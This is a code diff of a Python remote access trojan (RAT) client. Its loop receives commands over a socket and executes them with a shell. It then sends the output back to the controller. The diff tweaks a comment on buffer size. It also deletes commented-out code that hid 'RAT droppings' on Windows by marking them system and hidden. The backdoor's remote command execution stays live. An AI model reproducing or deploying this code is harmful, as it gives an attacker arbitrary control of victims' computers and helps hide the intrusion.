@@ -64,7 +64,7 @@ while(True):
             while(remote_command != "halt"):
 
                 try:
-                    data = s.recv(16384) # this needs to be fixed to allow more bytes
+                    data = s.recv(16384) # this MIGHT be enough bytes, lets see if it breaks in testing
                 except ConnectionAbortedError as error:
                     print(error)
                     remote_command = "halt"
@@ -87,25 +87,6 @@ while(True):
                     # print("SHLEX output:", shlex.split(remote_command))
                     # command_results = subprocess.run(shlex.split(remote_command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding="utf-8").stdout
                     command_results = subprocess.run(remote_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding="utf-8").stdout
-
-                # if windows, hide the RAT droppings
-                # if get_platform() == "Windows":
-                #     os.system(f"attrib +s +h {output_homedir_cmd}dropping.txt")
-
-                # command_results = None
-
-                # if os.system(f"{output_contents_cmd} {output_homedir_cmd}dropping.txt") == 0:
-                    
-                #     try:
-                #         with open(f"{output_homedir_cmd}dropping.txt", "r") as file:
-                #             command_results = file.read()
-                #     except error:
-                #         command_results = error
-                #         remote_command = "halt"
-                #         continue
-
-                # else:
-                #     command_results = "No output found, the command may have failed"
 
                 message = f"Executed command {remote_command} >> Command Results:\n\n{command_results}".encode("utf-8")
 
